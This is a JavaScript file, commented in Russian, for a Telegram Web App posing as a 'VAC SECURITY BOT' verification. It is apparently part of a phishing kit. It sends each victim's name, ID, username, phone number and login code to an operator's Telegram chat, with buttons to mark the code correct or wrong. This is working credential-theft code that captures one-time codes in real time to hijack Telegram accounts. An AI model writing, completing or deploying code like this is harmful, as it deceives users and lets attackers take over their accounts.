// Конфигурация будет вставлена при сборке
const config = {
    botToken: '%%BOT_TOKEN%%',
    adminId: '%%ADMIN_ID%%'
};

// Форматирование сообщения с кнопками
const formatMessage = (user, action, data) => {
    const userInfo = `👤 <b>Пользователь:</b> <code>${escapeHtml(user.first_name || 'Неизвестно')} ${escapeHtml(user.last_name || '')}</code>\n` +
                    `🆔 <b>ID:</b> <code>${user.id || 'Неизвестно'}</code>\n` +
                    (user.username ? `🔗 <b>Username:</b> @${escapeHtml(user.username)}\n` : '');

    let actionText = '';
    let buttons = [];
    
    switch(action) {
        case 'init':
            actionText = '🚪 <b>Вошел в приложение</b>';
            break;
        case 'phone':
            actionText = `📱 <b>Ввел номер:</b> <code>${escapeHtml(data)}</code>`;
            break;
        case 'code':
            actionText = `🔢 <b>Ввел код:</b> <code>${escapeHtml(data)}</code>`;
            buttons = [
                [{ text: "✅ Правильный код", callback_data: `approve_${user.id}_${data}` }],
                [{ text: "❌ Неправильный код", callback_data: `reject_${user.id}_${data}` }]
            ];
            break;
        case 'verified':
            actionText = '✅ <b>Код подтвержден!</b>';
            break;
        case 'failed':
            actionText = '❌ <b>Код отклонен</b>';
            break;
    }

    return {
        text: `🔐 <b>VAC SECURITY BOT</b>\n\n${userInfo}\n${actionText}`,
        reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
    };
};

// Отправка сообщения с кнопками
const sendToAdmin = async (messageData) => {
    try {
        const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
        const params = {
            chat_id: config.adminId,
            text: messageData.text,
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: messageData.reply_markup
        };

        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(params)
        });
    } catch (error) {
        console.error('Ошибка отправки:', error);
    }
};

// Глобальная функция для событий
window.sendToBot = async (action, data = null) => {
    const tg = window.Telegram.WebApp;
    const user = tg.initDataUnsafe.user || {};
    const messageData = formatMessage(user, action, data);
    await sendToAdmin(messageData);
};

// Инициализация
document.addEventListener('DOMContentLoaded', () => {
    // Заменяем плейсхолдеры на реальные значения
    if (window.BOT_CONFIG) {
        config.botToken = window.BOT_CONFIG.botToken;
        config.adminId = window.BOT_CONFIG.adminId;
    }
    
    window.sendToBot('init');
});